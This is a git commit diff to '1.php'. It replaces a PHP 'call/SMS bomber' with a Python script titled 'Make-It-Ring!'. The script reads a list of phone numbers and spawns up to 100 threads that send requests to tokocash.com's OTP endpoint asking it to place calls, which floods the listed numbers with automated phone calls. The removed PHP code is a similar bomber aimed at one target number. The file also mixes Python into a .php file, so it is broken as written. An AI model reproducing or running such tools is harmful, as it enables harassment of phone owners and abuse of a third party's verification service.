326008c95a2f2a1150c147423081109b90e711d0
S4ufiXed21 <40341927+S4ufiXed21@users.noreply.github.com>
2018-07-29 16:12:00 +0700

    Update 1.php

--- 1.php
+++ 1.php
@@ -1,25 +1,51 @@
 <?php
 include 'func.php';
-
-/*
-    https://github.com/nee48/BomTelpSmsTokped
-    Made by Handika
-*/
-
-$init = new Bom();
-
-//Eksekusi Call/Sms Boomber (Limit 100x/Jam)
-
-echo "Nomor Target : ";
-$a = trim(fgets(STDIN));
-$init->no = "$a";
-$init->type = 2; //Type 2 untuk telpon, Type 1 untuk sms
-//$init->no = "0895371761108"; //Nomer Hp tujuan
-
-if ($init->type == 1) {
-	for ($i=0; $i < 2; $i++) { 
-	    $init->Verif($init->no,$init->type);
-	}
-}elseif ($init->type == 2) {
-	 $init->Verif($init->no,$init->type);
-}
+print("""\
+   __  __________  __
+  /  |/  /  _/ _ \/ / | Make-It-Ring!
+ / /|_/ // // , _/_/  | Author: P4kL0nc4t
+/_/  /_/___/_/|_(_)   | https://github.com/p4kl0nc4t
+""")
+import thread
+import requests
+import sys
+try:
+	file = sys.argv[1]
+except:
+	print("usage: {} <numbers_list>".format(sys.argv[0]))
+	sys.exit()
+numbers = open(sys.argv[1], "r").readlines()
+count = 0
+processc = 0
+running_threads = 0
+print_used = False
+max_threads = 100
+print("[-----info-----]: read {} numbers from {}".format(len(numbers), file))
+def process(number):
+	global running_threads
+	global processc
+	global print_used
+	running_threads += 1
+	number = number.rstrip()
+	url = "https://www.tokocash.com/oauth/otp"
+	data = {"msisdn": number.rstrip(), "accept": "call"}
+	headers = {"X-Requested-With": "XMLHttpRequest"}
+	r = requests.post(url, data=data, headers=headers)
+	while print_used:
+		pass
+	print_used = True
+	print("\r[0x" + str(thread.get_ident()) + "]: " + number + " (status: " + r.json()['code'] + ")")
+	print_used = False
+	processc += 1
+	running_threads -= 1
+	return 1
+for number in numbers:
+	while running_threads >= max_threads:
+		pass
+	if number == "" or number[0] == ";": continue
+	count += 1
+	thread.start_new_thread(process, ( number, ))
+while processc != count:
+	pass
+print("[-----done-----]: Success Send Semua Ke No List")
+sys.exit()
